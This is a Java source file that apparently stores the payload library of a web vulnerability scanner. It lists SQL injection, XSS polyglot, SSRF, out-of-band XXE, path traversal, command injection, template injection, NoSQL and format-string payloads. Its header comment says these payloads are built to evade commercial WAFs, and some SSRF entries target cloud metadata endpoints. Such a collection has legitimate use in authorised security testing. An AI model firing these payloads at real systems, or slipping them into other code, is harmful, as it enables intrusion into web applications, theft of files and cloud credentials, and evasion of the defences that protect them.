package icarus.modules;

import java.util.Arrays;
import java.util.List;

/**
 * PayloadRepository stores evasive, polyglot payloads designed to bypass modern WAFs (Cloudflare, Akamai).
 * Migrated from legacy config strings.
 * Includes Canary Probes for lightweight fuzzing before heavy polyglots.
 */
public class PayloadRepository {

    public static final List<String> CANARY_PROBES = Arrays.asList(
        "icarus_probe_123'\"",
        "icarus_probe_<>"
    );

    public static final List<String> SQLI_TIME = Arrays.asList(
        "'/*//*/oR/*//*/1/*//*/=/*//*/1--",
        "' OR (SELECT * FROM (SELECT(SLEEP(10-(IF(1=1,0,10)))))a)--",
        "'; SELECT pg_sleep(CAST(version() LIKE 'PostgreSQL%' AS integer) * 10)--",
        "1' WAITFOR DELAY '0:0:10'--\n1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--\n1'; SELECT pg_sleep(10)--"
    );

    public static final List<String> XSS_POLYGLOT = Arrays.asList(
        "<svg/onmouseover=\"confirm(1)\"/class=\"x\">",
        "<details/open/ontoggle=prompt(1)>",
        "'\">><script>/*<svg/onload=confirm(1)>*/</script>",
        "{{$on.constructor('alert(1)')()}}"
    );

    public static final List<String> SSRF_EVASION = Arrays.asList(
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://0x7f.0.0.1/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/",
        "http://google.com@127.0.0.1/"
    );

    public static final List<String> XXE_OOB = Arrays.asList(
        "<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://{COLLABORATOR_PAYLOAD}\">\n%ext;\n]>\n<root/>",
        "<!DOCTYPE root [\n<!ENTITY \n  xxe \n  SYSTEM \n  \"http://{COLLABORATOR_PAYLOAD}\" >]>"
    );

    public static final List<String> PATH_TRAVERSAL = Arrays.asList(
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc//passwd",
        "/%5C../%5C../%5C../%5C../etc/passwd"
    );

    // --- Seed defaults for ParamValidator config-driven payload lists ---
    // LIGHT depth uses index 0, so each list is ordered "safety then signal":
    // cheapest syntax/error probe first, louder boolean/union/evasion payloads later.

    // Index 0 is "' OR '1'='1" on purpose: it's the one payload ParamValidator's
    // out-of-box detector (boolean baseline-diff, STRING_SQLI) actually flags, so
    // LIGHT depth still has a working probe. The rest need Behavioral Analysis on.
    public static final String SQLI_DEFAULT =
        "' OR '1'='1\n" +
        "'\n" +
        "1' ORDER BY 1--\n" +
        "' UNION SELECT NULL--\n" +
        "admin' --";

    // XSS_POLYGLOT[0] carries an event handler, so JSoup can confirm a real DOM
    // breakout (not just "uncertain") — a better LIGHT-depth probe than a bare
    // custom tag would be. Used verbatim.
    public static final String XSS_DEFAULT = String.join("\n", XSS_POLYGLOT);

    public static final String PATH_TRAVERSAL_DEFAULT = String.join("\n", PATH_TRAVERSAL);

    // SQLI_TIME's last element embeds literal \n (3 payloads in one string);
    // String.join flattens it so split("\\R") yields clean single-line entries.
    public static final String SQLI_TIME_DEFAULT = String.join("\n", SQLI_TIME);

    // Numeric / unquoted context only. First line matches the module's current
    // number-branch fallback literal so existing behaviour is preserved.
    public static final String SQLI_TIME_NUMBER_DEFAULT =
        "1-(WAITFOR DELAY '0:0:10')\n" +
        "1 AND SLEEP(10)--\n" +
        "1; SELECT pg_sleep(10)--";

    public static final String CMDI_DEFAULT = "; id\n| whoami\n`id`\n$(id)";

    public static final String SSTI_DEFAULT = "${7*7}\n{{7*7}}\n#{7*7}\n<%= 7*7 %>";

    public static final String SSRF_HEURISTIC_DEFAULT =
        "http://169.254.169.254/latest/meta-data/\n" +
        "http://169.254.169.254/computeMetadata/v1/\n" +
        "http://127.0.0.1/\n" +
        "http://localhost/";

    public static final String NOSQLI_DEFAULT = "{\"$ne\": null}\n{\"$gt\": \"\"}";

    public static final String FORMAT_STRING_DEFAULT = "%s%x%n\n%p%p%p";

    public static final String UNICODE_DEFAULT = "‮test😀";
}
